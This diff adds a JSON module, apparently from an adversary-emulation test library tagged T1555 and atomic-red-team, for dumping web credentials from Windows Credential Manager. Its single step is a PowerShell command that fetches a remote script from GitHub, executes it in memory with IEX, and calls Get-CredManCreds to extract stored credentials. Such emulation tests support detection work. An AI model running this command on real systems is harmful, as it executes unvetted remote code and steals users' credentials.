@@ -1,0 +1,23 @@
+{
+  "id": "8fd5a296-6772-4766-9991-ff4e92af7240",
+  "name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]",
+  "description": "This module will extract the credentials from Windows Credential Manager",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "829ccad8-eaae-437c-95b8-0c9d200ca173",
+      "type": "execute-command",
+      "data": {
+        "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1555",
+    "atomic-red-team"
+  ]
+}
